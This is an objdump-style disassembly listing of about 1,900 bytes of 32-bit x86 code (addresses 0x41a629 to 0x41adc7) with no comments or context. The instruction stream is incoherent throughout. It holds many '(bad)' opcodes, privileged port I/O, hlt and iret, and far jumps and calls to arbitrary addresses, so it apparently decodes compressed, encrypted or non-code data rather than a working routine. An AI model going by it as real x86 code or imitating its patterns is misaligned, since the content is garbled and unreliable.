  41a629:	fldcw  WORD PTR [edi-0x58]
  41a62c:	rcr    DWORD PTR [eax],cl
  41a62e:	shr    BYTE PTR [ebx+0x26],0xa
  41a632:	push   0x94acfd32
  41a637:	rcl    BYTE PTR [edi-0x3e],0xe5
  41a63b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a63c:	jecxz  0x41a6ab
  41a63e:	xchg   ebp,eax
  41a63f:	jmp    0x41a658
  41a641:	ficomp DWORD PTR [ebp+0x6b]
  41a644:	out    0x1c,eax
  41a646:	in     al,dx
  41a647:	jno    0x41a65f
  41a649:	daa    
  41a64a:	test   bl,cl
  41a64c:	pop    edi
  41a64d:	and    eax,0x403e46c6
  41a652:	xchg   DWORD PTR [ebx],esp
  41a654:	xchg   DWORD PTR [ebp+eiz*8+0x7b],eax
  41a658:	sub    DWORD PTR [ebp+0x7a],edi
  41a65b:	mov    dl,BYTE PTR [ebx+0x49]
  41a65e:	inc    eax
  41a65f:	xor    dh,BYTE PTR [esi]
  41a661:	xor    BYTE PTR [esi-0x5133bcf7],dh
  41a667:	out    0x55,eax
  41a669:	push   eax
  41a66a:	push   eax
  41a66b:	sub    eax,DWORD PTR [eax-0x7e]
  41a66e:	xchg   ebp,eax
  41a66f:	dec    edx
  41a670:	cld    
  41a671:	into   
  41a672:	scas   al,BYTE PTR es:[edi]
  41a673:	scas   al,BYTE PTR es:[edi]
  41a674:	mov    esp,0x145378e7
  41a679:	call   0x94820ad7
  41a67e:	leave  
  41a67f:	xor    dl,BYTE PTR [edi]
  41a681:	inc    edx
  41a682:	ss (bad) 
  41a684:	push   edx
  41a685:	ds mov al,0x7e
  41a688:	in     eax,0x98
  41a68a:	mov    eax,DWORD PTR [ebx]
  41a68c:	mov    eax,0xb20f910a
  41a691:	push   es
  41a692:	mov    al,0x56
  41a694:	rdtsc  
  41a696:	test   DWORD PTR [ebp+0x37],0xa96b395d
  41a69d:	cmp    al,0x18
  41a69f:	(bad)  
  41a6a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a6a1:	stos   DWORD PTR es:[edi],eax
  41a6a2:	xchg   ebx,eax
  41a6a3:	cwde   
  41a6a4:	mov    al,0xf1
  41a6a6:	cmc    
  41a6a7:	mov    al,ds:0xb14d24c9
  41a6ac:	jae    0x41a728
  41a6ae:	clc    
  41a6af:	mov    bl,0xd1
  41a6b1:	ret    0x8cff
  41a6b4:	pop    edi
  41a6b5:	mov    ebx,0x9c114b37
  41a6ba:	shr    BYTE PTR [ecx-0x7d],1
  41a6bd:	iret   
  41a6be:	aas    
  41a6bf:	sub    al,0xab
  41a6c1:	(bad)  
  41a6c2:	and    al,0xc0
  41a6c4:	dec    edi
  41a6c5:	xor    eax,ebx
  41a6c7:	iret   
  41a6c8:	inc    ebp
  41a6c9:	mov    ah,0xfd
  41a6cb:	(bad)  
  41a6cc:	clc    
  41a6cd:	xor    eax,ebx
  41a6cf:	and    edi,ecx
  41a6d1:	pop    esp
  41a6d2:	add    eax,0x467f3af6
  41a6d7:	or     DWORD PTR [ecx+0x5fba21b1],0x781d4d91
  41a6e1:	stmxcsr DWORD PTR [esi]
  41a6e4:	(bad)  
  41a6e6:	xor    DWORD PTR [edi-0xf],ecx
  41a6e9:	pop    es
  41a6ea:	(bad)  
  41a6eb:	cdq    
  41a6ec:	data16 mov cl,0x5a
  41a6ef:	mov    ecx,0x4a954671
  41a6f4:	test   eax,edi
  41a6f6:	call   0xa81d:0x542cfa7f
  41a6fd:	xchg   ebx,edx
  41a6ff:	bound  esi,QWORD PTR [ebp-0x596e3209]
  41a705:	xor    DWORD PTR [edx+0x5d],ebx
  41a708:	mov    esi,0xde7ce53d
  41a70d:	fwait
  41a70e:	or     al,0x7e
  41a710:	fs gs fwait
  41a713:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a714:	and    al,0x25
  41a716:	dec    edi
  41a717:	in     al,dx
  41a718:	add    al,0x79
  41a71a:	push   edi
  41a71b:	mov    edi,0x7a80d23c
  41a720:	jns    0x41a76c
  41a722:	dec    BYTE PTR ds:[ecx]
  41a725:	xor    BYTE PTR [ebp-0x4b],cl
  41a728:	pop    edx
  41a729:	fsubr  QWORD PTR [ecx+0x28]
  41a72c:	fld    TBYTE PTR [eax+eiz*4-0x6f6443f9]
  41a733:	out    dx,al
  41a734:	mov    ah,BYTE PTR [edi+0x2e72d9d2]
  41a73a:	fimul  DWORD PTR [esi]
  41a73c:	fadd   st,st(0)
  41a73e:	push   ebp
  41a73f:	or     bh,BYTE PTR [edx]
  41a741:	jp     0x41a771
  41a743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a744:	dec    ecx
  41a745:	call   DWORD PTR [edi]
  41a747:	jmp    0x41a6e4
  41a749:	mov    ebp,0x40ee9cf0
  41a74e:	not    BYTE PTR [eax+0x3]
  41a751:	sbb    DWORD PTR [esi-0x79],0x19
  41a755:	fimul  DWORD PTR [edi]
  41a757:	mov    cl,bl
  41a759:	sub    DWORD PTR [ebp+0x397ea229],ecx
  41a75f:	dec    esi
  41a760:	cmp    BYTE PTR [ecx+0x2],cl
  41a763:	dec    esp
  41a764:	fs pop ss
  41a766:	jmp    0x41a7a8
  41a768:	and    ah,al
  41a76a:	cmp    al,0x9
  41a76c:	int    0x6d
  41a76e:	push   0xffffff95
  41a770:	lods   eax,DWORD PTR ds:[esi]
  41a771:	sbb    cl,al
  41a773:	test   eax,0x8f058305
  41a778:	out    0x1a,al
  41a77a:	mov    eax,ds:0x346910ea
  41a77f:	daa    
  41a780:	mov    esi,0x9b4d183a
  41a785:	icebp  
  41a786:	shl    DWORD PTR [edi],1
  41a788:	out    dx,eax
  41a789:	imul   edi,DWORD PTR [ebx+eiz*4+0x6e694b6],0xffffffec
  41a791:	gs sbb bl,bh
  41a794:	xchg   esi,eax
  41a795:	pop    esp
  41a796:	xor    BYTE PTR [ebp-0x71],cl
  41a799:	dec    edi
  41a79a:	mov    ecx,0x1f29f391
  41a79f:	cmp    BYTE PTR [ebp-0x12fba752],dl
  41a7a5:	cmp    DWORD PTR [edx+eax*1-0x21437a87],esi
  41a7ac:	jle    0x41a778
  41a7ae:	mov    esi,0x616b3500
  41a7b3:	pop    es
  41a7b4:	xor    eax,0x86e4f3c6
  41a7b9:	xchg   ecx,eax
  41a7ba:	sub    eax,0x7a815f77
  41a7bf:	pop    esi
  41a7c0:	or     esi,esi
  41a7c2:	add    DWORD PTR [ecx+0x7b3bc90d],esi
  41a7c8:	push   eax
  41a7c9:	push   esp
  41a7ca:	xchg   edx,eax
  41a7cb:	test   eax,0xeba0d961
  41a7d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7d1:	sub    esp,esi
  41a7d3:	aas    
  41a7d4:	add    dh,BYTE PTR [ecx-0x2f]
  41a7d7:	mov    al,0x76
  41a7d9:	push   ecx
  41a7da:	jmp    FWORD PTR [ecx-0x787674e8]
  41a7e0:	idiv   DWORD PTR [ebp+0x3]
  41a7e3:	outs   dx,BYTE PTR ds:[esi]
  41a7e4:	frndint 
  41a7e6:	sahf   
  41a7e7:	or     bh,ch
  41a7e9:	shl    DWORD PTR [ebp+0x64],cl
  41a7ec:	or     al,0x30
  41a7ee:	ins    DWORD PTR es:[edi],dx
  41a7ef:	dec    esi
  41a7f0:	push   eax
  41a7f1:	push   0xbfdf416
  41a7f6:	inc    ecx
  41a7f7:	lds    edx,FWORD PTR [ebp+0x18]
  41a7fa:	add    ebx,DWORD PTR [edx]
  41a7fc:	mov    ebx,0x4808f2ad
  41a801:	repnz fst DWORD PTR ss:[edx+0x22]
  41a806:	retf   
  41a807:	loopne 0x41a834
  41a809:	(bad)  
  41a80a:	fidivr WORD PTR [eax]
  41a80c:	retf   0x3290
  41a80f:	inc    esi
  41a810:	mov    eax,0x215771e
  41a815:	or     BYTE PTR [eax],dl
  41a817:	int3   
  41a818:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a819:	ds fwait
  41a81b:	pop    eax
  41a81c:	aad    0x7
  41a81e:	mov    esi,0x3e971732
  41a823:	mov    dh,cl
  41a825:	mov    edx,0x49eb39b5
  41a82a:	or     BYTE PTR [ebx-0x5d],dl
  41a82d:	add    DWORD PTR [edx-0x24],edi
  41a830:	enter  0x21eb,0xf6
  41a834:	shl    BYTE PTR [ecx+0x68],cl
  41a837:	xor    DWORD PTR [ecx+eiz*8+0x2d304eb8],ecx
  41a83e:	es in  al,dx
  41a840:	and    ch,dl
  41a842:	data16 mov bl,0x75
  41a845:	xor    ebx,ebx
  41a847:	mul    BYTE PTR [ebp-0x6d]
  41a84a:	inc    edi
  41a84b:	add    al,0x37
  41a84d:	retf   0xcdfe
  41a850:	popa   
  41a851:	mov    ecx,0xfc03e79b
  41a856:	jbe    0x41a877
  41a858:	pop    es
  41a859:	cwde   
  41a85a:	xchg   ecx,eax
  41a85b:	mov    esi,0x371924df
  41a860:	fcmove st,st(0)
  41a862:	aam    0x63
  41a864:	mov    DWORD PTR [esp+ebp*8+0x6b],0x9c32c4ab
  41a86c:	hlt    
  41a86d:	imul   eax,DWORD PTR [edi+0x5f],0x71ae2b22
  41a874:	mov    gs,ebp
  41a876:	jbe    0x41a8d8
  41a878:	sti    
  41a879:	idiv   ch
  41a87b:	sub    cl,BYTE PTR [esi]
  41a87d:	or     DWORD PTR [eax],eax
  41a87f:	sub    eax,0x554c058d
  41a884:	xchg   ecx,eax
  41a885:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a886:	adc    DWORD PTR [edx],0xe29bd162
  41a88c:	adc    eax,esi
  41a88e:	jo     0x41a833
  41a890:	sub    esi,DWORD PTR [ebx+0x60c63612]
  41a896:	xor    BYTE PTR [esi+0x67],dh
  41a899:	or     al,0xcb
  41a89b:	out    dx,eax
  41a89c:	add    eax,0x4f95e167
  41a8a1:	mov    bh,0xfa
  41a8a3:	lods   al,BYTE PTR ds:[esi]
  41a8a4:	mov    dl,0xf
  41a8a6:	mov    DWORD PTR [edi+0x47],esi
  41a8a9:	imul   ebx,DWORD PTR [esi+esi*8],0xfffffff3
  41a8ad:	sbb    BYTE PTR [esi+0xad202de],ah
  41a8b3:	call   0x70f3c354
  41a8b8:	jb     0x41a929
  41a8ba:	loop   0x41a93b
  41a8bc:	and    eax,0x20ad15d6
  41a8c1:	inc    ebp
  41a8c2:	push   edi
  41a8c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8c4:	mov    ebp,0x903c0989
  41a8c9:	in     al,0x24
  41a8cb:	aad    0xb7
  41a8cd:	ret    
  41a8ce:	mov    ecx,0x8d14301f
  41a8d3:	in     eax,0xd8
  41a8d5:	xor    DWORD PTR [edx],ebp
  41a8d7:	jmp    0xbae40110
  41a8dc:	popa   
  41a8dd:	inc    ebp
  41a8de:	into   
  41a8df:	gs and al,0xe0
  41a8e2:	pop    es
  41a8e3:	mov    ds:0xb219437c,eax
  41a8e8:	push   edx
  41a8e9:	dec    edx
  41a8ea:	xor    eax,0x14c31160
  41a8ef:	mov    ?,WORD PTR [ebx+eax*4]
  41a8f2:	xor    bh,BYTE PTR [esi+esi*2-0x1e]
  41a8f6:	sub    edi,DWORD PTR [ecx-0x65c78c88]
  41a8fc:	cdq    
  41a8fd:	fst    DWORD PTR ds:0x73809a5e
  41a903:	cmpxchg8b QWORD PTR [edx-0x11]
  41a907:	jg     0x41a97a
  41a909:	add    eax,0xa8628029
  41a90e:	repnz adc al,0x8a
  41a911:	sub    bl,BYTE PTR [edi]
  41a913:	leave  
  41a914:	in     eax,dx
  41a915:	sub    DWORD PTR [ecx+0x47],eax
  41a918:	sbb    DWORD PTR [esi+0x3cd4042e],ebp
  41a91e:	cdq    
  41a91f:	and    cl,dl
  41a921:	fs pop edi
  41a923:	(bad)  
  41a925:	(bad)  
  41a926:	popf   
  41a927:	pop    ebx
  41a928:	es cli 
  41a92a:	xchg   esi,eax
  41a92b:	pop    DWORD PTR [ecx-0x13]
  41a92e:	and    eax,0xd1b1eef0
  41a933:	add    eax,0xf24027ca
  41a938:	imul   esi,esi,0x55ef3370
  41a93e:	cmc    
  41a93f:	adc    al,0x1b
  41a941:	out    0xae,eax
  41a943:	cmc    
  41a944:	je     0x41a9a5
  41a946:	lods   al,BYTE PTR ds:[esi]
  41a947:	cli    
  41a948:	xchg   DWORD PTR [ebx-0xd],ebp
  41a94b:	les    ebx,FWORD PTR [eax]
  41a94d:	sub    esp,DWORD PTR [edx+0x2a]
  41a950:	mov    esp,0x52b5847e
  41a955:	leave  
  41a956:	lods   al,BYTE PTR ds:[esi]
  41a957:	sbb    DWORD PTR [edx-0x2f],0x273f100a
  41a95e:	repnz cld 
  41a960:	(bad)  
  41a961:	adc    BYTE PTR [edx],bl
  41a963:	jo     0x41a928
  41a965:	mov    ch,0x41
  41a967:	xchg   esi,eax
  41a968:	xchg   BYTE PTR [edi-0x51],dl
  41a96b:	sahf   
  41a96c:	cmp    ebx,DWORD PTR ds:0xe8e4a3a7
  41a972:	and    cl,BYTE PTR [ebp-0x6f6fd6f5]
  41a978:	push   ss
  41a979:	and    dl,al
  41a97b:	dec    esi
  41a97c:	jmp    0x4e1f:0x7aae9a72
  41a983:	(bad)  
  41a984:	stos   BYTE PTR es:[edi],al
  41a985:	hlt    
  41a986:	add    BYTE PTR [edi],cl
  41a988:	mov    es,WORD PTR [edx+0x17]
  41a98b:	dec    eax
  41a98c:	aaa    
  41a98d:	(bad)  
  41a98e:	(bad)  
  41a98f:	sbb    ecx,DWORD PTR [ebx+esi*8+0x1a907677]
  41a996:	loop   0x41a941
  41a998:	mov    al,ds:0x51062e20
  41a99d:	je     0x41a9d9
  41a99f:	jb     0x41a983
  41a9a1:	jl     0x41a997
  41a9a3:	sbb    al,0xb3
  41a9a5:	fsub   QWORD PTR [edx-0x56e1feac]
  41a9ab:	or     BYTE PTR ss:[esi],dh
  41a9ae:	and    DWORD PTR [esi+0x3085c22b],eax
  41a9b4:	addr16 mov esp,0x49e38a4
  41a9ba:	retf   0x57f5
  41a9bd:	(bad)  
  41a9be:	jnp    0x41a962
  41a9c0:	pop    ebx
  41a9c1:	jo     0x41a9fb
  41a9c3:	lahf   
  41a9c4:	sub    cl,BYTE PTR [eax]
  41a9c6:	adc    eax,0x9fb327d2
  41a9cb:	aas    
  41a9cc:	pusha  
  41a9cd:	lahf   
  41a9ce:	(bad)  
  41a9cf:	fisub  WORD PTR [edi+0x7a]
  41a9d2:	pop    edx
  41a9d3:	push   edi
  41a9d4:	das    
  41a9d5:	adc    eax,0xc8e255aa
  41a9da:	retf   0x7cee
  41a9dd:	scas   eax,DWORD PTR es:[edi]
  41a9de:	gs jno 0x41aa22
  41a9e1:	xor    BYTE PTR [ebp+0x376225aa],bl
  41a9e7:	fisub  WORD PTR [ebp+0x4d]
  41a9ea:	mov    ds:0xd5e6b78,eax
  41a9ef:	push   eax
  41a9f0:	bound  ecx,QWORD PTR [edx+esi*2]
  41a9f3:	push   es
  41a9f4:	out    0x65,al
  41a9f6:	dec    ebx
  41a9f7:	stc    
  41a9f8:	adc    ebx,DWORD PTR [ecx+esi*4]
  41a9fb:	into   
  41a9fc:	inc    esp
  41a9fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9fe:	cmp    al,0x8c
  41aa00:	cmp    eax,0x80af72b7
  41aa05:	inc    DWORD PTR ds:0x665acaa
  41aa0b:	cmc    
  41aa0c:	cmp    BYTE PTR [ecx+0x41432766],dl
  41aa12:	ror    DWORD PTR [ebp-0x2],1
  41aa15:	sub    BYTE PTR [edi+0x6d564cbc],dh
  41aa1b:	rcl    BYTE PTR [ecx-0x57],0xb0
  41aa1f:	imul   DWORD PTR [edx]
  41aa21:	jge    0x41aa81
  41aa23:	push   ebx
  41aa24:	cld    
  41aa25:	xor    DWORD PTR [ebx+ecx*4],ebp
  41aa28:	mov    bh,0xf0
  41aa2a:	loope  0x41aa51
  41aa2c:	xor    DWORD PTR [esi+edi*8],eax
  41aa2f:	pop    es
  41aa30:	sar    esp,1
  41aa32:	out    dx,al
  41aa33:	xchg   ebp,eax
  41aa34:	daa    
  41aa35:	push   esi
  41aa36:	(bad)  
  41aa37:	push   esp
  41aa38:	xor    eax,0x96fdeda9
  41aa3d:	xchg   edi,eax
  41aa3e:	push   0xa3976240
  41aa43:	les    eax,FWORD PTR [ecx-0x72ee9b71]
  41aa49:	push   0x6
  41aa4b:	lods   eax,DWORD PTR ds:[esi]
  41aa4c:	ror    BYTE PTR [ebx],1
  41aa4e:	mov    ds:0xe5a9b2d4,al
  41aa53:	pop    ebx
  41aa54:	sbb    dl,BYTE PTR [esi-0x741ff490]
  41aa5a:	mov    ecx,0x3bb8fa0b
  41aa5f:	mov    ds:0x806a9bc6,eax
  41aa64:	fiadd  DWORD PTR [esi-0x5228f525]
  41aa6a:	push   ds
  41aa6b:	adc    BYTE PTR [eax+edx*2-0x519fb76],0x25
  41aa73:	pusha  
  41aa74:	mov    edx,ss
  41aa76:	add    BYTE PTR [eax],0x14
  41aa79:	bound  ebx,QWORD PTR [ebp+0x7fca1919]
  41aa7f:	xchg   BYTE PTR [edi-0x46],dh
  41aa82:	mov    eax,ds:0x3ebb2d7b
  41aa87:	lods   al,BYTE PTR ds:[esi]
  41aa88:	xchg   DWORD PTR [esi-0x4f],edi
  41aa8b:	or     ah,bh
  41aa8d:	mov    eax,ds:0xcaa436a5
  41aa92:	sub    edx,DWORD PTR [eax-0x674c7896]
  41aa98:	jle    0x41aab7
  41aa9a:	ja     0x41aad6
  41aa9c:	and    BYTE PTR ds:[edx+edi*8],dl
  41aaa0:	in     al,dx
  41aaa1:	xchg   edx,esi
  41aaa3:	repz sbb bh,BYTE PTR fs:[eax]
  41aaa7:	je     0x41ab1f
  41aaa9:	dec    ebp
  41aaaa:	cmc    
  41aaab:	pop    es
  41aaac:	cmp    bl,BYTE PTR [edx+0x3]
  41aaaf:	fwait
  41aab0:	loope  0x41aace
  41aab2:	push   ss
  41aab3:	lahf   
  41aab4:	xor    al,0x1e
  41aab6:	and    eax,DWORD PTR [edx-0x68728446]
  41aabc:	or     eax,0xe9b9be5e
  41aac1:	inc    ecx
  41aac2:	lods   eax,DWORD PTR ds:[esi]
  41aac3:	fsubr  QWORD PTR [edx]
  41aac5:	retf   
  41aac6:	mov    bl,0x34
  41aac8:	mov    ebx,0x305d44c2
  41aacd:	jo     0x41aa65
  41aacf:	or     al,0x47
  41aad1:	imul   edx
  41aad3:	loopne 0x41ab2a
  41aad5:	retf   
  41aad6:	das    
  41aad7:	add    eax,0x8adbc7de
  41aadc:	and    eax,0x25f4ca9b
  41aae1:	in     al,0x1f
  41aae3:	mov    DWORD PTR [edi],ecx
  41aae5:	fucomip st,st(5)
  41aae7:	mov    dh,0x5f
  41aae9:	div    DWORD PTR [ecx-0x6dda3183]
  41aaef:	cmp    bl,ah
  41aaf1:	shr    BYTE PTR [ebx+0x682163f1],cl
  41aaf7:	fmul   st,st(3)
  41aaf9:	stc    
  41aafa:	imul   eax,ebp,0xfffffffc
  41aafd:	jns    0x41ab67
  41aaff:	cwde   
  41ab00:	inc    ecx
  41ab01:	addr16 jne 0x41ab74
  41ab04:	aad    0x13
  41ab06:	pop    ds
  41ab07:	mov    bl,0x86
  41ab09:	push   ebp
  41ab0a:	xor    edi,DWORD PTR [ebx+0x2b2ddee7]
  41ab10:	xor    cl,0xc3
  41ab13:	gs out 0x3d,ax
  41ab17:	add    al,0x3a
  41ab19:	xchg   ebp,eax
  41ab1a:	fist   WORD PTR [esi]
  41ab1c:	imul   edx,ecx,0x61
  41ab1f:	call   0x88d1:0x55a5b79b
  41ab26:	test   al,0x1f
  41ab28:	sub    al,0x8b
  41ab2a:	jl     0x41ab9a
  41ab2c:	and    BYTE PTR [eax+0x4e],dl
  41ab2f:	ret    0x3d7f
  41ab32:	adc    eax,edi
  41ab34:	or     DWORD PTR [ecx],0xe69ea16c
  41ab3a:	pop    eax
  41ab3b:	jmp    0x50284f9
  41ab40:	push   ds
  41ab41:	or     al,0xe0
  41ab43:	mov    eax,0xecdcf8fd
  41ab48:	mov    dh,0x92
  41ab4a:	sbb    ah,BYTE PTR [esi+0x31]
  41ab4d:	in     al,dx
  41ab4e:	sbb    DWORD PTR [ecx-0x24],0x6e
  41ab52:	pop    edx
  41ab53:	lea    esp,[eax]
  41ab55:	cmc    
  41ab56:	inc    ebx
  41ab57:	jmp    0x41ab92
  41ab59:	mov    edx,0x9a978fb7
  41ab5e:	rcr    DWORD PTR [esi+0x59c7a564],1
  41ab64:	mov    edi,0x5bb009c0
  41ab69:	arpl   cx,ax
  41ab6b:	les    edi,FWORD PTR [edi-0x50]
  41ab6e:	mov    bl,0x99
  41ab70:	imul   ecx,DWORD PTR [edi],0xf355e189
  41ab76:	sbb    BYTE PTR [eax+0x4],ah
  41ab79:	xchg   ebx,eax
  41ab7a:	mov    WORD PTR [esi],gs
  41ab7c:	fidiv  DWORD PTR [esi]
  41ab7e:	(bad)  
  41ab7f:	rcr    ebx,cl
  41ab81:	mov    eax,DWORD PTR [ebp+0x4f7fb744]
  41ab87:	lods   eax,DWORD PTR ds:[esi]
  41ab88:	cld    
  41ab89:	cmp    ebp,DWORD PTR [edi+esi*2-0x5136fe0f]
  41ab90:	clc    
  41ab91:	mov    ds:0x729dead7,eax
  41ab96:	mov    al,ds:0x712d49a7
  41ab9b:	jmp    0x4f9757b2
  41aba0:	xchg   ebp,eax
  41aba1:	ins    BYTE PTR es:[edi],dx
  41aba2:	jmp    0x41abb3
  41aba4:	mov    dl,0x8f
  41aba6:	ds aaa 
  41aba8:	mov    WORD PTR [eax+0x3b],es
  41abab:	jp     0x41aba9
  41abad:	aaa    
  41abae:	mov    ecx,0x99f0308a
  41abb4:	xchg   esi,eax
  41abb5:	mov    ebx,0x11d841c6
  41abba:	add    al,0x56
  41abbc:	jbe    0x41ab66
  41abbe:	stos   BYTE PTR es:[edi],al
  41abbf:	(bad)  
  41abc1:	adc    edx,esp
  41abc3:	popf   
  41abc4:	push   ss
  41abc5:	mov    ebp,0xeeda7e5e
  41abca:	jmp    0x41ac12
  41abcc:	push   esi
  41abcd:	int    0x12
  41abcf:	(bad)  
  41abd0:	rol    DWORD PTR [edi-0x1deb7f44],cl
  41abd6:	xor    eax,DWORD PTR [ebx+0x32501385]
  41abdc:	mov    esi,0x534f6d01
  41abe1:	jge    0x41ac2d
  41abe3:	adc    BYTE PTR [ebx+0x1a],bl
  41abe6:	lds    ebx,FWORD PTR [edx+edx*2+0x15]
  41abea:	clc    
  41abeb:	jbe    0x41ab82
  41abed:	shl    BYTE PTR [esi],0x1a
  41abf0:	xor    al,0x16
  41abf2:	cmp    BYTE PTR [edi+0x3e],ch
  41abf5:	enter  0xbf2a,0x5a
  41abf9:	test   DWORD PTR [ebx+0x3f],ecx
  41abfc:	pusha  
  41abfd:	xor    bh,bl
  41abff:	push   0x71e0b2dc
  41ac04:	hlt    
  41ac05:	sti    
  41ac06:	push   ds
  41ac07:	imul   edx,DWORD PTR [ebx+0x5c9bdad6],0x746932bf
  41ac11:	adc    eax,0xda0fa853
  41ac16:	pop    ds
  41ac17:	or     eax,0x280fed50
  41ac1c:	push   ss
  41ac1d:	mov    bh,0x68
  41ac1f:	fsub   st,st(0)
  41ac21:	dec    esi
  41ac22:	jl     0x41ac07
  41ac24:	sbb    BYTE PTR [esi],dl
  41ac26:	push   edx
  41ac27:	and    ah,ch
  41ac29:	cs cli 
  41ac2b:	pop    ecx
  41ac2c:	or     ah,BYTE PTR [ebx-0x15]
  41ac2f:	psubq  mm4,mm2
  41ac32:	lahf   
  41ac33:	lds    edi,FWORD PTR [ecx+0x6c64c693]
  41ac39:	inc    edx
  41ac3a:	test   BYTE PTR [esi+0x7b],dh
  41ac3d:	mov    ebp,0x4a8b29fd
  41ac42:	daa    
  41ac43:	sub    al,0x1e
  41ac45:	push   ss
  41ac46:	mov    es,WORD PTR [ecx+0x4ac30bd6]
  41ac4c:	rcr    DWORD PTR [edi-0x52],0x2f
  41ac50:	push   0xd9bd7f5
  41ac55:	push   ss
  41ac56:	dec    edi
  41ac57:	into   
  41ac58:	or     ebx,edx
  41ac5a:	xchg   esi,eax
  41ac5b:	mov    bh,0x42
  41ac5d:	dec    edx
  41ac5e:	(bad)
  41ac61:	inc    ebp
  41ac62:	out    dx,al
  41ac63:	out    dx,al
  41ac64:	jb     0x41ac4f
  41ac66:	std    
  41ac67:	ror    BYTE PTR [ebx+0xb],0x41
  41ac6b:	mov    dh,0x1f
  41ac6d:	repz (bad) 
  41ac6f:	cdq    
  41ac70:	cmc    
  41ac71:	ss pusha 
  41ac73:	arpl   WORD PTR [ecx+0x3791e941],si
  41ac79:	hlt    
  41ac7a:	data16 cmp al,0x7d
  41ac7d:	or     cl,0xf6
  41ac80:	xlat   BYTE PTR ds:[ebx]
  41ac81:	adc    eax,DWORD PTR [ecx+edi*2+0x577aa430]
  41ac88:	or     eax,0x61db095e
  41ac8d:	loope  0x41acf2
  41ac8f:	dec    esi
  41ac90:	test   ecx,esp
  41ac92:	cmp    al,0x89
  41ac94:	test   al,0x28
  41ac96:	push   ss
  41ac97:	clc    
  41ac98:	(bad)  
  41ac99:	sbb    ebx,edx
  41ac9b:	retf   
  41ac9c:	mov    edi,0x6c9bfb39
  41aca1:	xchg   edx,eax
  41aca2:	mov    BYTE PTR [ebp-0x58],bl
  41aca5:	push   cs
  41aca6:	cwde   
  41aca7:	int    0xd8
  41aca9:	lods   al,BYTE PTR ds:[esi]
  41acaa:	pop    ss
  41acab:	outs   dx,DWORD PTR ds:[esi]
  41acac:	add    ch,BYTE PTR [edi+0xe]
  41acaf:	sbb    bh,BYTE PTR [ebx-0xe2d9c32]
  41acb5:	(bad)  
  41acb6:	imul   edx,DWORD PTR [esi],0x5935961e
  41acbc:	push   edi
  41acbd:	push   eax
  41acbe:	les    edi,FWORD PTR ds:0xa4aea518
  41acc4:	sub    eax,0x620b7604
  41acc9:	(bad)  
  41acca:	cdq    
  41accb:	sub    al,0x78
  41accd:	mov    al,0x2f
  41accf:	test   BYTE PTR [ebx-0x4983eb1d],0xc2
  41acd6:	mov    esp,0x477bdddd
  41acdb:	sub    al,0x5f
  41acdd:	stc    
  41acde:	push   esi
  41acdf:	add    BYTE PTR [edi+0x3c0515d4],0xf3
  41ace6:	sbb    edx,DWORD PTR [edi]
  41ace8:	outs   dx,DWORD PTR ds:[esi]
  41ace9:	pop    ecx
  41acea:	call   0xfd21:0x426ebdcf
  41acf1:	xchg   ecx,eax
  41acf2:	mov    ds:0x5a26a857,eax
  41acf7:	sbb    eax,0x421d6849
  41acfc:	mov    dh,0x86
  41acfe:	scas   eax,DWORD PTR es:[edi]
  41acff:	out    0xb3,eax
  41ad01:	jg     0x41ad51
  41ad03:	in     al,0xa7
  41ad05:	push   esp
  41ad06:	and    eax,0x9ba2577d
  41ad0b:	mov    ah,0x1e
  41ad0d:	mov    cl,al
  41ad0f:	mov    ah,0x1e
  41ad11:	lds    ebx,FWORD PTR [ebp+0x60]
  41ad14:	xchg   esi,eax
  41ad15:	cld    
  41ad16:	iret   
  41ad17:	test   BYTE PTR [ecx-0x7bf9aaa9],al
  41ad1d:	jecxz  0x41accb
  41ad1f:	jl     0x41acb7
  41ad21:	aaa    
  41ad22:	clc    
  41ad23:	test   al,0x35
  41ad25:	mov    ds:0x9c92517c,al
  41ad2a:	cmp    eax,0x21fdd906
  41ad2f:	jmp    0x6004:0x626769af
  41ad36:	sub    al,0x5
  41ad38:	mul    DWORD PTR [eax-0x7b]
  41ad3b:	pop    esi
  41ad3c:	or     al,0x4a
  41ad3e:	cli    
  41ad3f:	dec    ecx
  41ad40:	(bad)  
  41ad41:	stos   BYTE PTR es:[edi],al
  41ad42:	mov    ds:0x29a1efd0,al
  41ad47:	arpl   si,dx
  41ad49:	mov    esp,0xa068f8f3
  41ad4e:	mov    al,ds:0x342a9098
  41ad53:	or     DWORD PTR [eax+ebx*2+0x33],ebp
  41ad57:	clc    
  41ad58:	inc    ebx
  41ad59:	xchg   ecx,eax
  41ad5a:	jne    0x41ad8f
  41ad5c:	push   esi
  41ad5d:	std    
  41ad5e:	and    eax,0x686be8dc
  41ad63:	int    0xc4
  41ad65:	pop    ss
  41ad66:	pop    eax
  41ad67:	fistp  QWORD PTR [edx+0x6606456f]
  41ad6d:	mov    DWORD PTR [esp+ebp*1-0x534474cc],ecx
  41ad74:	jno    0x41ad4f
  41ad76:	mov    cl,0xde
  41ad78:	shl    BYTE PTR [eax],0x8c
  41ad7b:	or     al,0xfa
  41ad7d:	in     eax,dx
  41ad7e:	adc    bl,BYTE PTR [eax+0x1f]
  41ad81:	mov    edx,0xb996e0de
  41ad86:	add    esp,edx
  41ad88:	adc    BYTE PTR [ecx],bl
  41ad8a:	sti    
  41ad8b:	dec    edx
  41ad8c:	imul   DWORD PTR [esi+0x7c]
  41ad8f:	mov    edx,DWORD PTR [edx+0xc9a4a00]
  41ad95:	dec    edi
  41ad96:	mov    ?,esp
  41ad98:	lahf   
  41ad99:	cmp    eax,0xbf2f07a4
  41ad9e:	ins    BYTE PTR es:[edi],dx
  41ad9f:	enter  0xba9e,0xbd
  41ada3:	mov    edx,0x23fa8733
  41ada8:	(bad)  
  41ada9:	sbb    esi,DWORD PTR [edi]
  41adab:	xor    DWORD PTR [ecx+0x41e2c468],0x27ef2c83
  41adb5:	cmp    ecx,0x74
  41adb8:	(bad)  
  41adb9:	mov    dl,0x18
  41adbb:	sti    
  41adbc:	lock jmp 0x3bd44626
  41adc2:	pop    eax
  41adc3:	jg     0x41adb6
  41adc5:	fs nop
  41adc7:	js     0x41add3
